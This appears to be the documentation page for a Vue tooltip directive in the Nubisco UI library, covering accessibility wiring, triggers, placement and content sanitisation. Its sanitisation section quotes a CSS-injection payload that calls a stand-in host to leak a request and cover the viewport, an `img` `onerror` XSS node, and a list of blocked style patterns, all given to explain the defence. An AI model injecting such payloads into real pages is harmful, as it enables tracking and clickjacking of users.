---
layout: nubisco
title: Tooltip
tabs: ['Usage', 'Api']
---

<doc-tab name="Usage">

`v-nb-tooltip` attaches a small floating chip to **any element**: a button, a link, a table cell, an icon, a `<span>` inside a shell slot. It opens on hover, on keyboard focus and on tap, positions itself against the viewport, and wires the text to assistive technology as either the element's **name** or its **description**.

```vue
<template>
  <NbButton
    v-nb-tooltip="{ body: 'Runs the import again from the last checkpoint' }"
  >
    Retry
  </NbButton>
</template>
```

The directive is installed with the library (`app.use(NubiscoUI)`), so there is nothing to import in a component.

## Anatomy

```
                    ┌───────────────────────────────┐
             (1)    │ Retry                     (2) │
                    │ 3 attempts left           (3) │
                    │ Shift-click to force      (4) │
                    └──────────────▽────────────────┘
                                   (5)
                              ┌─────────┐
                       (6)    │   ⟳     │
                              └─────────┘
```

| #   | Part   | Element                 | Optional                                            |
| --- | ------ | ----------------------- | --------------------------------------------------- |
| 1   | Chip   | `span.nb-tooltip`       | no                                                  |
| 2   | Header | `div.nb-tooltip-header` | yes, `header`                                       |
| 3   | Body   | `div.nb-tooltip-body`   | yes, `body`                                         |
| 4   | Tip    | `div.nb-tooltip-tip`    | yes, `tip`                                          |
| 5   | Caret  | `::before` / `::after`  | drawn on the side the chip is on, re-aimed on clamp |
| 6   | Anchor | your element            | no                                                  |

All three text parts are optional and a chip with none of them never opens, which is what makes a binding built from a possibly-empty value safe. The chip is not part of your DOM: it is appended to `<body>` (see the DOM contract in the Api tab), so no ancestor's `overflow`, `transform` or `z-index` can clip it.

## When it is the right affordance

| The situation                                                               | Reach for                                                                                 |
| --------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| An icon-only control needs a name                                           | This directive, in **label** mode. The single most common case in the fleet.              |
| A named control needs one extra clause of context                           | This directive, in **description** mode                                                   |
| A truncated cell must expose its full value                                 | This directive, with `overflowOnly: true` and `focusable: true`                           |
| A disabled control must explain why it is disabled                          | This directive. It works on natively-disabled controls, which is not free (see below)     |
| The content must be clicked, scrolled, copied by button, or contains a link | Not a tooltip. [`NbInfoHint`](/ui/components/info-hint), which pins on click              |
| The user must read it to proceed                                            | Not a tooltip. Put the sentence in the interface, or use a [modal](/ui/components/modal)  |
| A form field's error, or a validation rule                                  | The field's own error slot. `NbTextInput` has `error` and `warning` props                 |
| A whole paragraph of help                                                   | Not a tooltip. A tooltip that needs three lines is usually a sentence the page is missing |

The last three matter more than they read. A tooltip is invisible until you go looking for it, it cannot be reached at all by a user who does not know it is there, and it disappears the moment attention moves. Anything that everyone needs to read is not a tooltip, no matter how convenient the anchor is.

## Label or description: pick one, on purpose

This is the decision that every hand-rolled tooltip in the fleet got wrong, and it is invisible until someone uses a screen reader.

| The anchor                                        | The tooltip is its | Wiring                                       |
| ------------------------------------------------- | ------------------ | -------------------------------------------- |
| An icon-only control. Nothing on screen names it. | **name**           | `aria-label` on the anchor, from mount       |
| Already named ("Publish", "Delete", a text cell). | **description**    | `aria-describedby` on the anchor, from mount |

Note the third column: **both are permanent**, and neither waits for a chip.

A **label** cannot only exist while a chip is on screen. A screen-reader user who reaches an icon button with <kbd>Tab</kbd>, or lists the buttons on the page, never triggers hover: if the name lives in the chip, they hear "button". So label mode writes a real `aria-label` on the anchor at mount and keeps it in step with the content.

A **description** must not replace a name. `aria-label` on an already-named control silently overwrites its name, so "Publish" becomes "Pushes this release to the live site" and the user can no longer tell you which button to press. Description mode leaves the name alone and points `aria-describedby` at a small visually hidden node that holds the same text.

That node is the part worth understanding, because it is where this went wrong before 3.2. A screen reader computes an element's description **when focus reaches it**. Wiring `aria-describedby` at the moment a chip appears is therefore too late by construction, and with a 400ms hover-intent delay in front of it, late by 400ms: the user tabs to the control, hears its name, and the sentence the tooltip exists to provide arrives after the announcement it should have been part of, if it arrives at all. So the text lives in a `<span class="nb-tooltip-description">` created with the binding, updated with the binding, and referenced by the anchor the whole time. The chip you can see is then purely visual, and carries `aria-hidden="true"` in every mode.

`aria: 'auto'` (the default) picks for you: **description** when the anchor already has an accessible name (its own text, an `aria-label`, an `aria-labelledby`, a `title`, or an `<img alt>` inside it), **label** when it has none. Set `aria` explicitly when you know better.

<preview dir="row">
  <NbButton icon="trash" v-nb-tooltip="{ body: 'Delete environment' }" />
  <NbButton v-nb-tooltip="{ body: 'Pushes this release to the live site' }">Publish</NbButton>
</preview>

```vue
<template>
  <!-- No text of its own (an icon and no slot), so the tooltip becomes
       aria-label="Delete environment" -->
  <NbButton icon="trash" v-nb-tooltip="{ body: 'Delete environment' }" />

  <!-- Already named "Publish": the tooltip becomes its description -->
  <NbButton v-nb-tooltip="{ body: 'Pushes this release to the live site' }">
    Publish
  </NbButton>
</template>
```

An existing name is never overwritten. If the anchor already carries `aria-label`, the directive stays in description mode and leaves the attribute untouched. An existing `aria-describedby` is preserved too: the description node's id is appended, so a field can be described by both its error message and its tooltip.

### A native `title` is removed

A `title` attribute on an anchor is a second tooltip: the browser draws its own box, on its own schedule, wherever the pointer happens to be, on top of the chip, and the accessibility tree takes the title as a name or a description depending on what else the element has, so the two compete for the same slot. There is no arrangement in which both are wanted. The directive stashes the attribute and removes it while the binding is live, and puts it back on unmount.

The removal happens **before** the label-or-description decision, which is the behaviour you want: an icon button whose only name was its `title` resolves to `label` and gets the tooltip text as its name, rather than being left anonymous with a description attached to nothing.

```vue
<template>
  <!-- title is removed; the button is named "Delete environment" -->
  <button title="Delete" v-nb-tooltip="{ body: 'Delete environment' }">
    <NbIcon name="trash" />
  </button>
</template>
```

## Triggers

| Trigger        | Opens                 | Closes                                                                                                                                                            |
| -------------- | --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Hover          | after `delay` (400ms) | `hideDelay` (150ms) after the pointer leaves the anchor **and** the chip                                                                                          |
| Keyboard focus | immediately           | on blur                                                                                                                                                           |
| Tap            | immediately           | after 4s, or on the next tap anywhere                                                                                                                             |
| Any trigger    | (n/a)                 | <kbd>Escape</kbd>, a pointerdown outside the chip, window blur, a drag starting, the anchor scrolling out of sight, another anchor opening a chip, a route change |

The keyboard row opens a chip, but it is not what makes the control readable to a screen reader. The name and the description are both on the anchor before the first <kbd>Tab</kbd> ever arrives (see [above](#label-or-description-pick-one-on-purpose)); the chip is what a sighted keyboard user sees. If the two ever disagree, the anchor's attributes are the contract and the chip is the decoration.

Three details that are easy to get wrong and are handled here:

- **Focus that came from a click does not open the tooltip.** Otherwise every icon button in a toolbar leaves a chip parked over the menu the click just opened. A focus arriving within 500ms of a pointerdown is treated as a click, not a <kbd>Tab</kbd>.
- **Keyboard and touch skip the hover-intent delay.** The delay exists to stop chips flashing as the cursor crosses a toolbar. A user who moved focus or tapped has already committed.
- **A pointer that arrives with a button held is dragging, not hovering.** Dragging a slider thumb, a reorder handle or a text selection across a toolbar used to pop a chip under the moving cursor for every control it crossed. An anchor entered with a button down stays quiet.
- **The synthetic mouse events a tap replays are ignored.** Touchscreen browsers fire a full mouse sequence after `touchstart`; honouring it would reopen the chip with no `mouseleave` ever coming to close it.

<kbd>Escape</kbd> closes the tooltip and never consumes the key, so the dialog or menu underneath still receives it. Every closer in that last row is the user saying "I am done reading this", and they all report the same reason, `dismiss`. The one exception is a route change, which is your application talking rather than the user, and reports `program`. The distinction only becomes visible in controlled mode, below, and it is the whole of it.

## Opening it yourself

Not every tooltip is opened by a hand. An onboarding step has to point at a control the user has not found yet, a "show me where" link has to open the chip it is describing, and a visual-regression snapshot of the open state has to exist without synthesising `MouseEvent`s. Three options cover those.

`defaultOpen` opens the chip once, on mount, and then gets out of the way: the first pointer-out closes it and everything behaves normally afterwards.

```vue
<template>
  <NbButton
    icon="wand"
    v-nb-tooltip="{
      body: 'New: generate a draft from a brief',
      defaultOpen: isFirstVisit,
    }"
  />
</template>
```

`open` is the controlled form. While it is a boolean, the directive never writes visibility itself: hover, focus and tap stop opening and closing the chip and instead report what the user did through `onOpenChange`, which is what stops the flicker every controlled/uncontrolled hybrid produces (the chip opening on hover and then being closed again by the next render that re-applies `open: false`). <kbd>Escape</kbd>, an outside pointerdown, window blur, a drag, the anchor scrolling out of sight and the orphan watchdog all report rather than act. Your state decides.

That includes the [one-chip rule](#accessibility). Opening any tooltip closes every other one, but a controlled chip is not the directive's to close, so what it gets instead is a report with the reason **`superseded`**, and it stays on screen until you lower `open`. This is deliberate and it is the only situation in which two chips are visible at once. The alternative is worse and was the behaviour before 3.2: closing the chip anyway leaves your `open` still `true`, so your very next render re-opens it, which tears down the chip that replaced it, which re-opens this one, and the two ping-pong for as long as the pointer keeps moving. If you want an unrelated hover to put your onboarding hint away, handle it:

```ts
onOpenChange: (open, reason) => {
  // The user has moved on to something else on the page.
  if (!open && (reason === 'dismiss' || reason === 'superseded')) {
    showHint.value = false
  }
}
```

`superseded` is a separate reason from `dismiss` on purpose. Nothing the user did was a dismissal of **your** tooltip: they crossed an icon button three panels away. A host that treats every `false` as "the user is done with this hint" would cancel an onboarding step on an accidental mouse movement.

```vue
<script setup lang="ts">
import { ref } from 'vue'
const showHint = ref(false)
</script>

<template>
  <NbButton
    icon="gear"
    v-nb-tooltip="{
      body: 'Settings',
      position: 'bottom',
      open: showHint,
      onOpenChange: (open) => (showHint = open),
    }"
  />
  <NbButton @click="showHint = true">Show me</NbButton>
</template>
```

Controlled mode has one obligation attached to it, and it is an accessibility one. When the user dismisses the chip, the directive reports `onOpenChange(false, 'dismiss')` and stops there: it does not close the chip, because `open` is yours and writing to it behind your back would only be undone by your next render. So a controlled tooltip is dismissable exactly as far as your handler makes it dismissable. Bind `open` to something your handler actually writes to. If you pass `open` with no `onOpenChange` at all, the directive says so once in the console during development, because at that point nothing the user does, <kbd>Escape</kbd> included, can ever take the chip down, and that is a WCAG 2.1 AA 1.4.13 failure.

The only path that overrides that gate is [`dismissAllTooltips()`](#route-changes-and-teardown), including the `vue-router` hook that calls it for you. A view is being torn down there, the anchor is going with it, and a chip left floating over the next screen helps nobody. It reports `program`, so a host that distinguishes the two reasons can tell a teardown from a dismissal.

`onOpenChange` also works on its own, uncontrolled, when you only need to know: it fires once per transition (never once per event) with `pointer`, `focus`, `touch`, `program`, `dismiss` or `superseded`.

A programmatic open never waits out the hover-intent delay, for the same reason a keyboard one does not: the decision has already been made.

## Disabled controls

"Why is this greyed out?" is one of the two things people reach for a tooltip to answer, and until 3.3 it was the one thing this directive could not do. A natively-disabled `<button>`, `<input>`, `<select>` or `<textarea>` fires **no mouse events at all**, so listeners on the anchor itself are dead: the binding was accepted, the `aria-label` was written, and nothing ever opened.

It works now, with no wrapper element and nothing to pass:

```vue
<template>
  <NbButton
    :disabled="!hasPaymentMethod"
    v-nb-tooltip="{
      body: 'Add a payment method before publishing',
      position: 'top',
      status: 'warning',
    }"
  >
    Publish
  </NbButton>
</template>
```

A disabled control is still hit-tested, so the events its **parent** receives carry pointer coordinates that fall inside it. When the anchor is natively disabled the directive listens on the parent instead and answers "is the pointer over my anchor?" geometrically. This is the wrapper-element workaround that component libraries usually ask you to write, done for you. Two consequences worth knowing:

- The escalation is re-evaluated on every render, so a control that becomes enabled goes back to its own listeners immediately (two sets at once would open the chip twice and close it when a sibling is crossed).
- It needs a parent element. An anchor that is a direct child of `<body>`, or has no parent at all, keeps the old behaviour.

`aria-disabled` controls are **not** escalated, and do not need to be: they are ordinary elements that receive their own events, keyboard focus included. That is one more reason to prefer `aria-disabled` for anything a keyboard user should be able to reach and be told about.

## Any element, including one that cannot take focus

A `<span>`, an `<svg>` or a `<td>` is not focusable, so its tooltip is unreachable by keyboard. The directive does **not** silently add a tab stop: an invisible extra stop in a 200-row table is its own accessibility defect. Pass `focusable: true` when the anchor carries information nothing else on the page carries, such as a truncated value or a bare status dot.

```vue
<template>
  <!-- Truncated cell: the full value exists nowhere else, so it must be reachable -->
  <span
    class="truncate"
    v-nb-tooltip="{ body: contact.email, overflowOnly: true, focusable: true }"
  >
    {{ contact.email }}
  </span>
</template>
```

`overflowOnly: true` shows the chip only when the element is actually clipped (`scrollWidth` exceeds its box), so a short value gets no redundant tooltip.

## Placement and collisions

`position` is a preference. The chip is placed on the requested side, and if it would leave the viewport it flips to the opposite side, then tries the orthogonal pair, then clamps itself inside the viewport with the arrow re-aimed at the anchor. This is what makes it safe in a shell rail, a fixed topbar or a scrolled table.

<preview dir="row">
  <NbButton v-nb-tooltip="{ body: 'Above the anchor', position: 'top' }">top</NbButton>
  <NbButton v-nb-tooltip="{ body: 'Right of the anchor', position: 'right' }">right</NbButton>
  <NbButton v-nb-tooltip="{ body: 'Below the anchor', position: 'bottom' }">bottom</NbButton>
  <NbButton v-nb-tooltip="{ body: 'Left of the anchor', position: 'left' }">left</NbButton>
  <NbButton v-nb-tooltip="{ body: 'Follows the cursor', followCursor: true }">cursor</NbButton>
</preview>

The default, `cursor`, tracks where the pointer entered. It has no meaning for a keyboard or touch trigger, so those fall back to `top` and then collide-and-flip like any other side. Give `position` an explicit side for anything a keyboard user will reach: it keeps the chip in the same place whichever way the control was activated.

## Delays

```vue
<template>
  <!-- Dense toolbar: quicker in, quicker out -->
  <NbButton
    icon="gear"
    v-nb-tooltip="{ body: 'Settings', delay: 150, hideDelay: 80 }"
  />

  <!-- Anchor next to a target the pointer must cross: keep it up longer -->
  <span v-nb-tooltip="{ body: 'Last synced 3 minutes ago', hideDelay: 500 }"
    >Synced</span
  >
</template>
```

## Content

`header`, `body` and `tip` render as three stacked lines, all optional. A tooltip with none of them never opens, so a binding built from a possibly-empty value is safe.

<preview dir="row">
  <NbButton v-nb-tooltip="{ header: 'Retry', body: '3 attempts left', tip: 'Shift-click to force' }">Header, body and tip</NbButton>
  <NbButton v-nb-tooltip="{ body: 'Row one<br><strong>Row two</strong>' }">Inline markup</NbButton>
</preview>

### A string is text

A string body is text with light emphasis. Eleven bare inline tags survive (`<b>`, `<strong>`, `<em>`, `<i>`, `<u>`, `<s>`, `<small>`, `<code>`, `<kbd>`, `<br>`, `<p>`), newlines become line breaks, and **no attributes are parsed at all**: `<p class="lead">` is shown as the characters you typed, not applied as markup. Anything that needs an attribute goes through the structured form below, where the value itself is checked.

That is narrower than it used to be, deliberately. Until 3.2 a string went through the library's shared escape helper, which lets `<p style="…" class="…">` through with its attribute **values** untouched. That is fine for a helper whose input is a literal you wrote. It is not fine here, because a string body is exactly the surface a CMS field, an API payload and a user-defined column formatter reach, and this payload contains not one character that escaping alters:

```
<p style="background-image:url(https://example.invalid/?leak=1);position:fixed;inset:0">…</p>
```

A remote request (a read receipt for whoever wrote the field) and a full-viewport click shield, in a string that survives every escaping pass anyone would think to apply to it. Attributes in strings are gone, and the payload above now renders as the text it is.

### Structured content

For anything richer pass an array of `{ component, props, content }` nodes instead of a string. Those nodes are **not** a way to write arbitrary HTML. Three separate checks apply:

1. **The tag name**, against an allowlist: `span`, `div`, `p`, `b`, `strong`, `em`, `i`, `u`, `s`, `small`, `code`, `kbd`, `br`, `ul`, `ol`, `li`. A rejected tag is dropped and its text is kept, so a bad node degrades to plain text instead of disappearing.
2. **The prop name**, against `class`, `style`, `dir`, `lang`. Everything else is dropped and the element is kept. Notably absent: every `on*` handler, `src`, `href`, `srcdoc`, `id` (it would collide with the chip's own `aria-describedby` id) and `title` (a native tooltip inside a tooltip).
3. **The prop value.** Escaping is not a defence for `style` or `class`, whose dangerous payloads contain no character escaping touches, so both are filtered before they are escaped. A `class` value must be plain CSS identifiers. A `style` value is filtered declaration by declaration against a typographic property allowlist (`color`, `font-*`, `text-*`, `margin`, `padding`, `opacity`, `display`, `gap`, `max-width`, `border-radius` and a few more), and any value containing `url(`, `image-set(`, `expression(` or a backslash escape is dropped whatever the property. `position`, `inset` and the offset properties are not on the list, so content cannot leave the chip's box.

Every rejection warns once in development, with the name of what was dropped.

None of this is paranoia about your own code. Before the tag allowlist, a node as ordinary-looking as `{ component: 'img', props: { src: 'x', onerror: '…' } }` became a live event handler inside the chip. The chip is additionally `contain: layout`, which makes it the containing block for anything positioned inside it: belt to the same braces.

```vue
<template>
  <NbButton
    v-nb-tooltip="{
      body: [
        {
          component: 'div',
          content: [
            { component: 'span', content: 'Signed by ' },
            { component: 'strong', content: user.name },
          ],
        },
      ],
      position: 'top',
    }"
  >
    Signature
  </NbButton>
</template>
```

Whatever the shape, the flattened text (header, then body, then tip) is what a screen reader gets in label mode, so keep it a sentence a person can hear.

### Long content

The chip wraps at `--nb-tooltip-max-width` (34 base units, about 55 characters at the chip's size) and lines are set at `--nb-line-height-snug`. Both matter more than they look: with no ceiling the chip shrink-wraps to a single line wider than the screen, and the viewport clamp cannot recover it because there is no position at which a too-wide box fits. Widen one chip with `chipClass` and `--nb-tooltip-max-width` if you must, but a tooltip that needs three lines is usually a sentence that belongs in the interface.

### Writing the text

The chip is about 55 characters wide and disappears when attention moves, so the text has to be readable in one glance. These are the rules the fleet's own tooltips break most often.

| Do                                                                          | Do not                                                                 | Why                                                                                                     |
| --------------------------------------------------------------------------- | ---------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| `body: 'Delete environment'`                                                | `body: 'Click here to delete this environment and all of its content'` | In label mode this text becomes the control's accessible name. A name is a noun phrase, not a sentence. |
| Name the action: `'Duplicate'`, `'Filters'`, `'Refresh'`                    | Name the icon: `'Two pages'`, `'Funnel'`, `'Circular arrow'`           | The user needs the outcome, not a description of the glyph.                                             |
| One or two words for an icon-only control                                   | A clause with a full stop                                              | It is a label. Sentence case, no trailing full stop.                                                    |
| `body: 'Publishes to the live site'` on a button already labelled "Publish" | `body: 'Publish'` on a button already labelled "Publish"               | A description that repeats the name is announced twice and tells a sighted user nothing.                |
| `status: 'default'` for a label                                             | `status: 'danger'` because the button is a delete button               | Colour that carries no information is noise, and reads as a state the control does not have.            |
| Put the shortcut in `tip`: `{ body: 'Save', tip: 'Cmd S' }`                 | Fold it into the body: `body: 'Save (Cmd S)'`                          | `tip` is styled as a demotion, and the flattened name stays clean.                                      |
| Reserve the tooltip for what is not on screen                               | Repeat visible text                                                    | A duplicate tooltip is one more thing to dismiss with no information in it.                             |
| Keep it to a line or two                                                    | Three lines of policy                                                  | It cannot be scrolled, copied by button, or kept open while you read something else.                    |

There are no illustrations on this page. Every row above is a code example instead, because that is the form a Vue consumer can act on, and a picture of a chip would not tell you which option produced it.

### The chip can be hovered

The pointer can move onto the chip, and doing so cancels the pending hide; leaving it starts the hide again. Text in the chip can be selected, so an error code or a full path can be copied.

This is not a nicety. WCAG 2.1 AA **1.4.13 Content on Hover or Focus** requires that content revealed by hover can itself be hovered without disappearing, and a chip that is `pointer-events: none` fails it by construction: nothing the user does with the mouse can ever land on it. The concrete victim is anyone at 200% zoom, who has to pan onto a clamped or wrapped chip to read the end of the sentence and watches it vanish on the way. Until 3.2 this library failed that clause, and the docs presented it as a feature.

**A tooltip is still not a container.** The chip takes no focus, is never in the tab order, closes on <kbd>Escape</kbd> and on the next pointerdown outside it, and holds nothing operable: no links, no buttons, no scroll. Hoverable is about _reading_, not about _operating_. If the content has to be clicked or scrolled, it is not a tooltip: use [`NbInfoHint`](/ui/components/info-hint) for a pinnable popover, or a [modal](/ui/components/modal) for anything larger.

## Tone

<preview dir="row">
  <NbButton v-nb-tooltip="{ body: 'Neutral, inverted surface' }">default</NbButton>
  <NbButton v-nb-tooltip="{ body: 'Primary', status: 'primary' }">primary</NbButton>
  <NbButton v-nb-tooltip="{ body: 'Extra context', status: 'info' }">info</NbButton>
  <NbButton v-nb-tooltip="{ body: 'Saved 2 minutes ago', status: 'success' }">success</NbButton>
  <NbButton v-nb-tooltip="{ body: 'This will be retried once', status: 'warning' }">warning</NbButton>
  <NbButton v-nb-tooltip="{ body: 'The last three runs failed', status: 'danger' }">danger</NbButton>
</preview>

`status` is the same word, with the same values, that `NbBanner` and `NbInlineLoading` use. It replaces `flavor`, which was typed `string` and therefore accepted anything: `flavor: 'warning'` compiled and produced a chip with no styles, because there was no `warning` rule to match it. Both the option and the two missing tones are fixed together. `flavor` still works and is not scheduled for removal.

The default chip is the inverted surface: `--nb-c-contrast` on `--nb-c-surface`, which flips with the theme. **A labelling tooltip stays on `default`.** A coloured chip on a plain icon button reads as a state the control does not have, and the colour is doing nothing the words are not. Reach for `danger` or `warning` only when the chip is explaining a failure or a blocked action, which is the case the fleet actually has: "why is this disabled".

## Replacing a hand-rolled tooltip in a shell slot

Three apps rebuilt this affordance to label icon-only controls in a shell topbar, because the only tooltip they could find was the one welded into `NbSidebarLink`. Each got a different geometry and one froze a colour:

```vue
<!-- Before: a private CSS tooltip. Hover only, so keyboard users get nothing;
     no accessible name, so a screen reader says "button"; a literal colour,
     so it ignores the theme. -->
<template>
  <button class="icon-btn" @click="openSettings">
    <NbIcon name="gear" />
    <span class="tip">Settings</span>
  </button>
</template>

<style scoped>
.tip {
  position: absolute;
  top: calc(100% + 6px);
  background: rgba(15, 15, 30, 0.95);
  opacity: 0;
}
.icon-btn:hover .tip {
  opacity: 1;
}
</style>
```

```vue
<!-- After: hover, focus and tap; a real accessible name; themed both ways;
     flips instead of overflowing the topbar. -->
<template>
  <NbButton
    icon="gear"
    v-nb-tooltip="{ body: 'Settings', position: 'bottom' }"
    @click="openSettings"
  />
</template>
```

## If you already had `v-nb-tooltip` on something

The binding is unchanged and nothing has been removed, but three behaviours are new and are visible without you changing a line. They are listed here because they are the sort of thing that looks like a regression if nobody told you.

| What changed                                                                                          | What you may notice                                                                                                                | If you do not want it                                                                                                                    |
| ----------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| The tooltip now opens on keyboard focus, not only on hover                                            | A chip appears when the anchor is tabbed to. Focus arriving from a click is ignored, so clicks are unaffected.                     | Nothing to disable: an icon-only control that only speaks to a mouse is the defect this fixes.                                           |
| An anchor with no accessible name gains a permanent `aria-label` (and `role="img"` if it has no role) | Screen readers announce the tooltip text as the element's name, and automated audits stop flagging the control                     | `aria: 'description'` or `aria: 'none'`                                                                                                  |
| Long text now wraps at a max width instead of running off the screen                                  | A tooltip that used to be one very long line is now two or three                                                                   | Raise `--nb-tooltip-max-width` on the chip via `chipClass`                                                                               |
| The chip is hoverable: the pointer can move onto it and it stays up                                   | Moving the mouse from the anchor towards the chip no longer closes it, and the chip is now clickable, so it can sit over a control | Nothing to disable: `pointer-events: none` is a WCAG 2.1 AA 1.4.13 failure. Move the chip with `position` if it lands somewhere awkward. |
| Attributes inside a plain **string** body are no longer parsed                                        | `<p style="…">` or `<p class="…">` in a string shows as text                                                                       | Use the structured `{ component, props, content }` form, where `style` and `class` values are checked rather than trusted                |
| Only one chip is on screen at a time, document-wide                                                   | A focused chip closes when an unrelated control is hovered                                                                         | Nothing to disable                                                                                                                       |
| A tooltip on a natively-disabled control now opens                                                    | Bindings that were silently dead (the control fired no mouse events) start showing chips                                           | Remove the binding, or bind it conditionally: `v-nb-tooltip="disabled ? { body: reason } : null"`                                        |
| `flavor` is now a real union, and `status` is its replacement                                         | A value outside the union stops compiling. It never had styles anyway.                                                             | Nothing: `flavor` keeps working, and `success` and `warning` now paint instead of doing nothing                                          |
| A chip that flipped at a viewport edge now flips **back** when the anchor moves into open space       | A chip in a scrolled panel changes sides more than it used to, and its caret always points at its anchor                           | `position` is still a preference; there is no way to forbid a flip, because the alternative is a chip off the edge of the window         |

## The chip follows the anchor

The chip lives in `<body>` and is positioned `fixed`, so it does not move with its trigger. Everything that moves the trigger without moving the chip would detach the two: scrolling **any** ancestor, resizing the window, a panel collapsing, a row animating in.

While a chip is on screen, the directive subscribes to capture-phase `scroll` on the document, to `resize`, and to a periodic check of the anchor's own rectangle. All three re-run placement, so the chip stays glued to the trigger. When the anchor scrolls out of view or is hidden, the chip goes with it rather than hovering over unrelated content.

Every re-placement starts again from the side you **asked** for, not the side the chip happens to be on, so a flip is temporary by construction: a chip that had to go below at the bottom of a panel returns above its anchor as soon as the anchor scrolls into open space. The side class, which is what draws the caret, is stripped and rewritten on every placement. Until 3.3 it was only rewritten when the chosen side _differed_ from the requested one, which is true on the way out and false on the way back: the chip moved above its anchor while keeping `nb-tooltip-bottom`, so the caret was drawn on its top edge pointing away from the thing it labelled. `tests/tooltip.test.ts` now drives placement with stubbed rectangles for both the anchor and the chip, and asserts the side class and the coordinates together, because a spec that checks only one of the two cannot see this class of defect.

The rectangle check is adaptive rather than per-frame. `getBoundingClientRect` forces a layout, and a chip is stationary most of the time, so the loop reads at 10 Hz while the page is quiet and at full frame rate for a third of a second after anything moves, which covers a scroll, a resize, a drag and an ancestor transition, because each of those keeps re-arming the burst. Style writes still only happen when the geometry actually changed.

Capture phase is the load-bearing detail: `scroll` does not bubble, so a listener on `window` hears nothing from a `NbShellPanel`, an inspector body or a scrolled table. That is why a tooltip inside a scrolled panel used to stay pinned at the coordinates it was born at.

"Out of view" means out of its **clipping ancestors**, not only out of the viewport. A row scrolled out of a table body, a field scrolled out of an inspector and a card scrolled out of a panel are all still inside the viewport and completely invisible, and a viewport-only test leaves the chip glued to an anchor nobody can see, floating over the panel's own chrome. When a chip opens, the directive walks the anchor's ancestors once and remembers those that clip (`overflow` other than `visible`); the chip goes down as soon as the anchor leaves any of them. The walk is done once per chip rather than per frame, because reading `overflow` forces a style recalculation and the frame loop must stay free of those.

None of this runs when nothing is open. The listeners and the frame loop are installed with the first visible chip and removed with the last, so a page with a thousand tooltip anchors and none open costs nothing.

## Route changes and teardown

Chips are appended to `<body>`, so an anchor that disappears mid-hover could orphan one. It cannot: the directive removes every chip an anchor owns when it unmounts, a watchdog reaps a chip whose anchor is gone or no longer engaged, and a `vue-router` `beforeEach` clears everything on navigation. Apps that route without `vue-router` can call `dismissAllTooltips()` themselves.

```ts
import { dismissAllTooltips } from '@nubisco/ui'

watch(currentView, () => dismissAllTooltips())
```

## The other tooltips in this library

| Use                                                      | Reach for                                                            |
| -------------------------------------------------------- | -------------------------------------------------------------------- |
| Label or describe any element, anywhere                  | `v-nb-tooltip`                                                       |
| Explain a term or a number next to it, with rich content | [`NbInfoHint`](/ui/components/info-hint) (click-pinnable, hoverable) |
| Show a validation message as an icon in a dense form row | [`NbMessage`](/ui/components/message) with `icon-only`               |

::: warning Deprecated paths
Two older tooltips remain for compatibility and should not be used in new code.

- **`NbSidebarLink`'s `tooltip` prop** is marked `@deprecated` in `ISidebarLinkProps`, so your editor says so at the call site. It renders a CSS `::after` chip: hover-only (no keyboard, no touch), no accessible name for the link, no flip when the rail is near a viewport edge, and fixed to the right of the anchor, so it is clipped by any sidebar that is not the shell's own. It works only on that one component, which is why three apps rebuilt the affordance for their topbars. Put `v-nb-tooltip="{ body: 'Projects', position: 'right' }"` on the link instead and leave the prop unset. The prop still works and is not scheduled for removal.
- **`NbMessage`'s icon-only tooltip** is private to that component and hover-only. It stays because it is bound to the icon-only variant, but do not copy the pattern; a message that has to be readable on keyboard should not be icon-only.
  :::

## Accessibility

- The tooltip is either the anchor's accessible **name** (`aria-label`) or its **description** (`aria-describedby` pointing at a hidden `role="tooltip"` node). **Both are on the anchor from mount**, so a screen reader that computes them at focus time finds them there. Auto mode picks by asking whether the anchor is already named. See the section above, and set `aria` explicitly if the guess would be wrong.
- Opens on `focusin` and closes on `focusout`, so an icon-only control is labelled for keyboard users. `focusin` bubbles, so the directive also works on a wrapper around the real control. Anchors may nest: the **innermost** anchor owns the trigger.
- **One chip is on screen at a time**, across the whole document. Opening one closes any other, whatever opened it. Nesting is the common case, but it is not the only one: a button reached with <kbd>Tab</kbd> and an unrelated sibling under the mouse are two anchors with no relationship at all, and before 3.2 both rendered a chip. The single exception is a chip you pinned open with `open`, which is reported as `superseded` and left standing, because closing it behind your state's back only makes the two chips fight; see [Opening it yourself](#opening-it-yourself).
- **Hoverable (WCAG 2.1 AA 1.4.13).** The chip is reachable by the pointer and stays up while the pointer is on it, which is what lets a magnified or wrapped chip be panned onto and finished. It still takes no focus and holds nothing operable.
- In label mode on an element that has no role of its own (a `<span>` status dot, an `<svg>`), the directive also sets `role="img"`. `aria-label` is prohibited on a generic element and is announced inconsistently or not at all, so without a role the name it promises can silently amount to nothing. An anchor that already has a role, or is natively interactive, is left alone.
- The tooltip never traps or moves focus. <kbd>Escape</kbd> dismisses it and passes the key through to whatever is underneath. In controlled mode (`open`) the directive reports the <kbd>Escape</kbd> as `onOpenChange(false, 'dismiss')` rather than closing behind your state's back: honour it, because a chip the user cannot dismiss is a WCAG 2.1 AA 1.4.13 failure. An outside pointerdown, a drag and the window losing focus report the same reason for the same purpose. `open` with no `onOpenChange` warns in development for exactly that reason.
- A **natively-disabled** control gets its tooltip through listeners on its parent, because the browser fires no events on the control itself. It is still not focusable, so the chip is pointer-only there: if the reason a control is disabled matters to a keyboard user, use `aria-disabled` (which stays focusable and receives its own events) and guard the handler instead.
- `defaultOpen` and `open` do not put anything in the tab order and do not move focus. A chip that opens on mount is announced through the anchor's own name or description, exactly as a hovered one is.
- Nothing is announced twice: the chip is `aria-hidden="true"` in **every** mode and holds no id and no role of its own, because the words are already on the anchor. That includes the awkward case of flipping the `aria` option while a chip is up: the whole wiring is re-run on update, so the anchor is left with exactly one of a name and a description, never both.
- A consumer's `aria-label`, `aria-labelledby` and `aria-describedby` are preserved. The directive removes only what it added, and removes it on unmount. A native `title` is the exception and is deliberately suppressed while the binding is live, because it is a competing tooltip; it is restored on unmount. See [above](#a-native-title-is-removed).
- `focusable: true` is opt-in, so no invisible tab stops appear behind your back. An anchor that already is focusable never gets a `tabindex`.
- Under `prefers-reduced-motion: reduce` the chip appears and disappears with no fade and no transform.
- Colour: the chip uses the inverted surface pair, correct in both themes. It is not tinted by the anchor, so a tooltip on a coloured control keeps its contrast.
- A tooltip is not a substitute for a visible label on a control that a first-time user must understand. If everyone needs the sentence, put the sentence in the interface.

